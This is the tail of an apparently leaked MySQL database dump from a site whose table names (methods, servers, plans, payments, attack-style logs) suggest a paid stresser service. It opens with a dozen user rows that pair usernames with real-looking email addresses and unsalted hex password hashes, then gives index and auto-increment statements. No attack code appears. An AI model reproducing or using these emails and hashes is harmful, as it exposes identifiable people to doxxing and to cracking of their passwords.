(1481, 'vnmq', '009d0622de653921014be98d76efec798441d5b5', '216vnmq@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1482, 'zanhyy', '78ce2b7dd333d2acac96f546a2ab77196675ea0c', 'zanhy@zanhy.zanhy', 0, 0, 0, 0, '0', 0, 0, 0),
(1483, 'wedki', '45fbb9309a5c7e3435a5a1c1dc6b2d55d08c1931', 'wedsadas32@sdasd.vcx', 0, 0, 0, 0, '0', 0, 0, 0),
(1484, 'rutzen', '174fc8732af61413caac5befe43d4b3260de0772', 'serolad_666@hotmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1485, 'wypad', 'f03b4f411f5f835eda0fffd74696c83e4e3d5f04', 'igidarek@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1486, 'xkorited', '9c448f0869934598571776ffaab2d54b45703f2e', 'xkorited@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1487, 'TCPSRV', '0ef2147529b1fa7dd551b6318578144eaf41b0f1', 'busy2137@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1488, 'Absence', '79029d22286034283b91cca4ebbe2723bab5e1e7', 'Absence@sec.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1489, 'JustAUserr', 'd3ffe13c8f71313b83e9a653874e8a84cca63f52', 'adsdasdsa@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1490, 'Krexythanos', 'eefe764206056fd3c517db84b27303d9ea41a48d', 'cooljordanmodz23@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0),
(1491, 'd4rky7', '297075535249edd97259ebed692a5b372187e886', 'd4rky7@outlook.be', 0, 0, 0, 0, '0', 0, 0, 0),
(1492, 'davidvondy', '04c0d65ab21282dfd5fcef17ddc3e055d276e41d', 'davidvonderhaar64@gmail.com', 0, 0, 0, 0, '0', 0, 0, 0);

--
-- Indici per le tabelle scaricate
--

--
-- Indici per le tabelle `actions`
--
ALTER TABLE `actions`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `id` (`id`);

--
-- Indici per le tabelle `api`
--
ALTER TABLE `api`
  ADD PRIMARY KEY (`id`);

--
-- Indici per le tabelle `blacklist`
--
ALTER TABLE `blacklist`
  ADD PRIMARY KEY (`ID`);

--
-- Indici per le tabelle `faq`
--
ALTER TABLE `faq`
  ADD PRIMARY KEY (`id`);

--
-- Indici per le tabelle `fe`
--
ALTER TABLE `fe`
  ADD PRIMARY KEY (`ID`);

--
-- Indici per le tabelle `iplogs`
--
ALTER TABLE `iplogs`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `ID` (`ID`);

--
-- Indici per le tabelle `loginlogs`
--
ALTER TABLE `loginlogs`
  ADD KEY `date` (`date`),
  ADD KEY `username` (`username`);

--
-- Indici per le tabelle `logs`
--
ALTER TABLE `logs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `time_date` (`time`,`date`,`handler`,`stopped`) USING BTREE;

--
-- Indici per le tabelle `messages`
--
ALTER TABLE `messages`
  ADD PRIMARY KEY (`messageid`);

--
-- Indici per le tabelle `methods`
--
ALTER TABLE `methods`
  ADD UNIQUE KEY `id_2` (`id`),
  ADD KEY `id` (`id`);

--
-- Indici per le tabelle `news`
--
ALTER TABLE `news`
  ADD PRIMARY KEY (`ID`);

--
-- Indici per le tabelle `payments`
--
ALTER TABLE `payments`
  ADD PRIMARY KEY (`ID`);

--
-- Indici per le tabelle `plans`
--
ALTER TABLE `plans`
  ADD PRIMARY KEY (`ID`);

--
-- Indici per le tabelle `reports`
--
ALTER TABLE `reports`
  ADD UNIQUE KEY `id` (`id`);

--
-- Indici per le tabelle `servers`
--
ALTER TABLE `servers`
  ADD PRIMARY KEY (`id`);

--
-- Indici per le tabelle `settings`
--
ALTER TABLE `settings`
  ADD UNIQUE KEY `key` (`key`),
  ADD KEY `sitename` (`sitename`(767));

--
-- Indici per le tabelle `tickets`
--
ALTER TABLE `tickets`
  ADD PRIMARY KEY (`id`);

--
-- Indici per le tabelle `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`ID`),
  ADD KEY `ID` (`ID`);

--
-- AUTO_INCREMENT per le tabelle scaricate
--

--
-- AUTO_INCREMENT per la tabella `actions`
--
ALTER TABLE `actions`
  MODIFY `id` int(64) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=673;

--
-- AUTO_INCREMENT per la tabella `api`
--
ALTER TABLE `api`
  MODIFY `id` int(2) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=151;

--
-- AUTO_INCREMENT per la tabella `blacklist`
--
ALTER TABLE `blacklist`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=69;

--
-- AUTO_INCREMENT per la tabella `faq`
--
ALTER TABLE `faq`
  MODIFY `id` int(3) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- AUTO_INCREMENT per la tabella `fe`
--
ALTER TABLE `fe`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=12;

--
-- AUTO_INCREMENT per la tabella `iplogs`
--
ALTER TABLE `iplogs`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT per la tabella `logs`
--
ALTER TABLE `logs`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=30634;

--
-- AUTO_INCREMENT per la tabella `messages`
--
ALTER TABLE `messages`
  MODIFY `messageid` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=571;

--
-- AUTO_INCREMENT per la tabella `methods`
--
ALTER TABLE `methods`
  MODIFY `id` int(2) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=937;

--
-- AUTO_INCREMENT per la tabella `news`
--
ALTER TABLE `news`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=98;

--
-- AUTO_INCREMENT per la tabella `payments`
--
ALTER TABLE `payments`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=360;

--
-- AUTO_INCREMENT per la tabella `plans`
--
ALTER TABLE `plans`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;

--
-- AUTO_INCREMENT per la tabella `reports`
--
ALTER TABLE `reports`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT per la tabella `servers`
--
ALTER TABLE `servers`
  MODIFY `id` int(2) NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT per la tabella `tickets`
--
ALTER TABLE `tickets`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=252;

--
-- AUTO_INCREMENT per la tabella `users`
--
ALTER TABLE `users`
  MODIFY `ID` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1493;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
